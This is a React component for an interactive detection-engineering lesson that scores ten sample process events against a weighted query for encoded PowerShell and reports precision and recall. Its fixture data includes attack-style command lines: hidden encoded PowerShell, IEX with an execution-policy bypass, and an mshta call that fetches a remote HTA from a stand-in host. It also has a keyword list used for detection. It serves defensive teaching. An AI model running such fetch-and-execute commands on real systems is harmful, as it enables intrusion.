"use client";

import { useState } from "react";
import { Crosshair } from "lucide-react";
import { Metric, StepButton, VisualizerShell } from "./VisualizerShell";

type FieldKey = "process" | "parent" | "commandLine" | "user" | "host";

interface SampleEvent {
  id: string;
  time: string;
  process: string;
  parent: string;
  commandLine: string;
  user: string;
  host: string;
  malicious: boolean;
  features: Record<FieldKey, boolean>;
}

const FIELD_META: Record<FieldKey, { label: string; weight: number; predicate: string }> = {
  process: { label: "Process", weight: 25, predicate: 'process == "powershell.exe"' },
  parent: { label: "Parent", weight: 20, predicate: "parent in [winword.exe, excel.exe, wscript.exe]" },
  commandLine: { label: "Command line", weight: 35, predicate: "command_line contains any [-enc, -bypass, downloadstring, iex]" },
  user: { label: "User", weight: 10, predicate: "user does not start with svc_" },
  host: { label: "Host", weight: 10, predicate: "host starts with WS-" },
};

const FIELD_KEYS = Object.keys(FIELD_META) as FieldKey[];

const EVENTS: SampleEvent[] = [
  {
    id: "E01", time: "09:02:19", process: "powershell.exe", parent: "winword.exe",
    commandLine: "powershell.exe -nop -w hidden -enc SQBFAFgA...", user: "alice", host: "WS-014", malicious: true,
    features: { process: true, parent: true, commandLine: true, user: true, host: true },
  },
  {
    id: "E02", time: "09:05:03", process: "powershell.exe", parent: "excel.exe",
    commandLine: "powershell.exe -File C:\\Tools\\quarterly-report.ps1", user: "bob", host: "WS-022", malicious: false,
    features: { process: true, parent: true, commandLine: false, user: true, host: true },
  },
  {
    id: "E03", time: "09:07:41", process: "powershell.exe", parent: "wscript.exe",
    commandLine: "powershell.exe -NoProfile -Command Get-Process", user: "svc_backup", host: "WS-031", malicious: false,
    features: { process: true, parent: true, commandLine: false, user: false, host: true },
  },
  {
    id: "E04", time: "09:11:27", process: "powershell.exe", parent: "explorer.exe",
    commandLine: "powershell.exe -nop -w hidden -enc UwBTAFkA...", user: "dana", host: "WS-008", malicious: true,
    features: { process: true, parent: false, commandLine: true, user: true, host: true },
  },
  {
    id: "E05", time: "09:14:08", process: "powershell.exe", parent: "cmd.exe",
    commandLine: "powershell.exe -ExecutionPolicy Bypass -Command IEX(Net.WebClient)", user: "erin", host: "WS-044", malicious: true,
    features: { process: true, parent: false, commandLine: true, user: true, host: true },
  },
  {
    id: "E06", time: "09:18:52", process: "powershell.exe", parent: "powershell.exe",
    commandLine: "powershell.exe -File C:\\Ops\\healthcheck.ps1", user: "frank", host: "WS-051", malicious: false,
    features: { process: true, parent: false, commandLine: false, user: true, host: true },
  },
  {
    id: "E07", time: "09:22:14", process: "powershell.exe", parent: "wscript.exe",
    commandLine: "powershell.exe -enc IwBTAFkAIABHAGUAdABQAHIAbwBjAGUAcwBzAA==", user: "svc_monitor", host: "SRV-012", malicious: false,
    features: { process: true, parent: true, commandLine: true, user: false, host: false },
  },
  {
    id: "E08", time: "09:26:33", process: "mshta.exe", parent: "outlook.exe",
    commandLine: "mshta.exe http://update.example.invalid/a.hta", user: "grace", host: "WS-027", malicious: true,
    features: { process: false, parent: false, commandLine: false, user: true, host: true },
  },
  {
    id: "E09", time: "09:31:06", process: "powershell.exe", parent: "excel.exe",
    commandLine: "powershell.exe -Command Get-ChildItem -Path D:\\Reports", user: "heidi", host: "WS-019", malicious: false,
    features: { process: true, parent: true, commandLine: false, user: true, host: true },
  },
  {
    id: "E10", time: "09:38:44", process: "powershell.exe", parent: "winword.exe",
    commandLine: "powershell.exe -nop -enc ZQB4AGUAYwB1AHQAaQBvAG4AIABiAHkAcABhAHMAcwA=", user: "ivan", host: "WS-063", malicious: true,
    features: { process: true, parent: true, commandLine: true, user: true, host: true },
  },
];

const DEFAULT_FIELDS: Record<FieldKey, boolean> = {
  process: true,
  parent: true,
  commandLine: true,
  user: false,
  host: false,
};

function percent(numerator: number, denominator: number) {
  return denominator === 0 ? "—" : `${Math.round((numerator / denominator) * 100)}%`;
}

export function DetectionQueryLab() {
  const [fields, setFields] = useState(DEFAULT_FIELDS);
  const [threshold, setThreshold] = useState(55);

  const scored = EVENTS.map((event) => {
    const score = FIELD_KEYS.reduce((total, key) => fields[key] && event.features[key] ? total + FIELD_META[key].weight : total, 0);
    return { ...event, score, matched: score >= threshold };
  });
  const matched = scored.filter((event) => event.matched);
  const truePositives = matched.filter((event) => event.malicious).length;
  const falsePositives = matched.length - truePositives;
  const positives = EVENTS.filter((event) => event.malicious).length;
  const falseNegatives = positives - truePositives;
  const selectedFields = FIELD_KEYS.filter((key) => fields[key]);
  const query = [
    "event.category == \"process_creation\"",
    `| extend risk_score = ${selectedFields.length > 0 ? selectedFields.map((key) => `(${FIELD_META[key].predicate}) * ${FIELD_META[key].weight}`).join(" + ") : "0"}`,
    `| where risk_score >= ${threshold}`,
  ].join("\n");

  function reset() {
    setFields(DEFAULT_FIELDS);
    setThreshold(55);
  }

  return (
    <VisualizerShell
      title="Build a detection, then measure it"
      description="A deterministic 10-event fixture for an encoded PowerShell hypothesis."
      onReset={reset}
      controls={
        <label className="block w-44">
          <span className="flex justify-between text-[9px] font-bold uppercase tracking-[0.08em] text-muted">
            <span>Risk threshold</span><output>{threshold}</output>
          </span>
          <input
            type="range"
            min={0}
            max={100}
            step={5}
            value={threshold}
            onChange={(event) => setThreshold(Number(event.target.value))}
            className="lab-range mt-1"
            aria-label="Detection risk score threshold"
          />
        </label>
      }
      footer={
        <span>
          <strong className="text-navy">ATT&CK label:</strong> T1059.001 · Command and Scripting Interpreter: PowerShell. A false positive is benign traffic that matches; a false negative is malicious traffic that misses. Precision = TP / (TP + FP) measures alert quality, while recall = TP / (TP + FN) measures coverage. Ground truth is hidden from the query and used only for this toy evaluation; production labels require reviewed incidents, red-team tests and benign fixtures. A technique tag alone does not prove coverage.
        </span>
      }
    >
      <div className="rounded-xl border border-line bg-mist-50 p-3">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <p className="text-[10px] font-bold uppercase tracking-[0.1em] text-muted">Include field predicates</p>
          <span className="inline-flex items-center gap-1.5 rounded-full border border-brand-200 bg-brand-50 px-2.5 py-1 text-[9px] font-bold text-brand-700">
            <Crosshair className="h-3 w-3" /> T1059.001 · PowerShell
          </span>
        </div>
        <div className="mt-2 flex flex-wrap gap-2">
          {FIELD_KEYS.map((key) => (
            <label key={key} className={`inline-flex cursor-pointer items-center gap-2 rounded-lg border px-3 py-1.5 text-[10px] font-semibold ${fields[key] ? "border-brand-300 bg-brand-50 text-brand-700" : "border-line bg-white text-body"}`}>
              <input
                type="checkbox"
                checked={fields[key]}
                onChange={(event) => setFields((value) => ({ ...value, [key]: event.target.checked }))}
                className="accent-brand-600"
              />
              {FIELD_META[key].label}<span className="font-mono text-[9px] text-muted">+{FIELD_META[key].weight}</span>
            </label>
          ))}
        </div>
      </div>

      <div className="mt-3 flex flex-wrap gap-1.5" aria-label="Detection threshold presets">
        {[{ label: "Broad · 35", value: 35 }, { label: "Balanced · 55", value: 55 }, { label: "Strict · 75", value: 75 }].map((preset) => (
          <StepButton key={preset.value} active={threshold === preset.value} done={false} onClick={() => setThreshold(preset.value)}>
            {preset.label}
          </StepButton>
        ))}
      </div>

      <div className="mt-4 grid grid-cols-2 gap-2 sm:grid-cols-5">
        <Metric label="Matched events" value={`${matched.length} / ${EVENTS.length}`} />
        <Metric label="Precision" value={percent(truePositives, matched.length)} tone="teal" />
        <Metric label="Recall" value={percent(truePositives, positives)} tone="gold" />
        <Metric label="False positives" value={falsePositives} tone={falsePositives > 0 ? "coral" : "teal"} />
        <Metric label="False negatives" value={falseNegatives} tone={falseNegatives > 0 ? "rose" : "teal"} />
      </div>

      <div className="mt-4 grid gap-4 lg:grid-cols-[1.25fr_0.75fr]">
        <div className="overflow-hidden rounded-xl border border-line">
          <div className="overflow-x-auto">
            <table className="w-full min-w-[760px] text-left text-[10px]">
              <caption className="sr-only">Ten deterministic process creation events and whether the generated detection matches</caption>
              <thead className="bg-mist-100 text-muted">
                <tr>
                  <th className="px-2 py-2 font-bold">Match</th>
                  <th className="px-2 py-2 font-bold">Time</th>
                  <th className="px-2 py-2 font-bold">Host</th>
                  <th className="px-2 py-2 font-bold">User</th>
                  <th className="px-2 py-2 font-bold">Process</th>
                  <th className="px-2 py-2 font-bold">Parent</th>
                  <th className="px-2 py-2 font-bold">Command line</th>
                  <th className="px-2 py-2 text-right font-bold">Score</th>
                </tr>
              </thead>
              <tbody>
                {scored.map((event) => (
                  <tr key={event.id} className={`border-t border-line ${event.matched ? "bg-brand-50/70" : "bg-white"}`}>
                    <td className="px-2 py-2">
                      <span className={`inline-flex rounded-full border px-2 py-0.5 text-[8px] font-bold uppercase ${event.matched ? "border-brand-300 bg-brand-100 text-brand-800" : "border-line bg-mist-50 text-muted"}`}>
                        {event.matched ? "Alert" : "Quiet"}
                      </span>
                    </td>
                    <td className="whitespace-nowrap px-2 py-2 font-mono text-muted">{event.time}</td>
                    <td className="whitespace-nowrap px-2 py-2 font-mono text-navy">{event.host}</td>
                    <td className="whitespace-nowrap px-2 py-2 font-mono text-navy">{event.user}</td>
                    <td className="whitespace-nowrap px-2 py-2 font-mono text-navy">{event.process}</td>
                    <td className="whitespace-nowrap px-2 py-2 font-mono text-navy">{event.parent}</td>
                    <td className="max-w-[260px] truncate px-2 py-2 font-mono text-body" title={event.commandLine}>{event.commandLine}</td>
                    <td className="px-2 py-2 text-right font-mono font-bold text-brand-700">{event.score}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        <div className="space-y-3">
          <div className="rounded-xl border border-line bg-navy p-3">
            <p className="text-[9px] font-bold uppercase tracking-[0.1em] text-brand-200">Generated pseudo-query</p>
            <pre className="mt-2 overflow-x-auto whitespace-pre-wrap break-words font-mono text-[9px] leading-5 text-mist-100"><code>{query}</code></pre>
          </div>
          <div className="rounded-xl border border-line bg-mist-50 p-3 text-[10px] leading-5 text-muted" aria-live="polite">
            {matched.length === 0
              ? "No event reaches the threshold. Recall is 0%, so a quiet queue can still hide real attacks."
              : `${matched.length} event${matched.length === 1 ? "" : "s"} reach ${threshold}: ${truePositives} true positive${truePositives === 1 ? "" : "s"} and ${falsePositives} false positive${falsePositives === 1 ? "" : "s"}. ${falseNegatives} malicious event${falseNegatives === 1 ? " is" : "s are"} missed. Raise the threshold to reduce noise, or add independent evidence to recover missed attacks without flooding analysts.`}
          </div>
        </div>
      </div>
    </VisualizerShell>
  );
}
